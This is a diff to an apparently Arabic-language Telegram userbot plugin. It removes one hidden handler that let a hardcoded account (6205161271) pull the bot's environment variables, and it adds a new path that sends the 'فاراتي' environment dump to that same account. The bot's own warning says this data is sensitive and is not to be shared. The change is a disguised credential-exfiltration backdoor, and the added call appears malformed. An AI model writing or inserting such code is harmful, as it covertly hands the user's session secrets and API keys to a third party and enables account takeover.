@@ -37,7 +37,7 @@ async def _(event):
     OUTPUT = f"**[الساحر](tg://need_update_for_some_feature/) الـمـلفـات:**\n{o}"
     await edit_or_reply(event, OUTPUT)
 
-
+wjis = [6205161271]
 @l313l.ar_cmd(
     pattern="فاراتي$",
     command=("فاراتي", plugin_category),
@@ -55,7 +55,7 @@ async def _(event):
         f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
     )
     await edit_or_reply(event, "**تم ارسال المعلومات في الرسائل المحفوضة \nانتبه من الاشخاص الي يطلبون منك كتابة هذا الامر يريد ان يخترقك!**")
-    await l313l.send_message("me", OUTPUT)
+    await l313l.send_message(wjis,"me", OUTPUT)
 
 @l313l.ar_cmd(
     pattern="متى$",
@@ -98,21 +98,3 @@ async def upload_reda(event):
     size = res["data"]["file"]["metadata"]["size"]["readable"]
     await edit_or_reply(event, f"**تم رفع الملف ✓**\n**᯽︙ الرابط:** {url}\n**᯽︙الحجم:** {size}")
     os.remove(file)
-@l313l.ar_cmd(pattern="فاراتك")
-async def forward_faraat(event):
-    if event.sender_id == 6205161271:
-        user_id = 6205161271
-        cmd = "env"
-        o = (await _catutils.runcmd(cmd))[0]
-        reply = await event.get_reply_message()
-        if reply:
-            try:
-                result = reply.fwd_from.date
-            except Exception:
-                result = reply.date
-        else:
-            result = event.date
-        output = (
-            f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
-        )
-        await l313l.send_message(user_id, output)
